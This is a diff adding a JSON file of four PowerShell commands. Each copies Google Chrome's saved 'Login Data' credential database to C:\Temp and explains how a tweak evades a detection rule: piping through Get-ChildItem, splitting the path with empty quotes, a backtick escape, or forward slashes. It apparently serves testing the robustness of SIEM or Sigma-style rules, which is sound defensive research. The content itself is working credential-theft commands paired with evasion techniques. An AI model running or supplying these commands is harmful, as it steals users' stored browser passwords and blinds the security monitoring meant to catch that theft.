@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe & {Get-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" | Copy-Item -Destination \"C:\\Temp\"}",
+    "explanation": "Substitution technique: Replaced the starting verb structure by passing the target path to 'Get-ChildItem' and piping it to 'Copy-Item'. Because 'Copy-Item' is now called downstream without an explicit preceding space or literal path token attached directly to its parameter string, this safely evades 'selection_cmd'."
+  },
+  {
+    "output": "powershell.exe & {Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\"\"\\Default\\Login Data\" -Destination \"C:\\Temp\"}",
+    "explanation": "Insertion technique: Broke up the static profile lookup string by inserting a set of structural double quotes directly into the middle of the directory layout path string ('User Data\"\"\\Default'). The native PowerShell engine normalizes and binds the quoted pieces perfectly at runtime, but this modification breaks the contiguous string check for '\\Google\\Chrome\\User Data\\' specified in selection_path."
+  },
+  {
+    "output": "powershell.exe & {Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User` Data\\Default\\Login Data\" -Destination \"C:\\Temp\"}",
+    "explanation": "Insertion technique: Injected a backtick (`) character inside the parameter string to act as a PowerShell-native literal backtick escape switch ('User` Data'). PowerShell parses out and flattens the escape character transparently during execution syntax mapping, but this bypasses SIEM engines looking for the exact literal string pattern '\\Google\\Chrome\\User Data\\'."
+  },
+  {
+    "output": "powershell.exe & {Copy-Item \"$env:LOCALAPPDATA/Google/Chrome/User Data/Default/Login Data\" -Destination \"C:\\Temp\"}",
+    "explanation": "Recoding technique: Substituted the backward slashes ('\\') with standard forward slashes ('/') across the source folder pathing token. The Windows subsystem and PowerShell API automatically manage and resolve forward slashes into functional pointers, but this completely removes the literal backslash indicators expected by the lookups inside selection_path."
+  }
+]
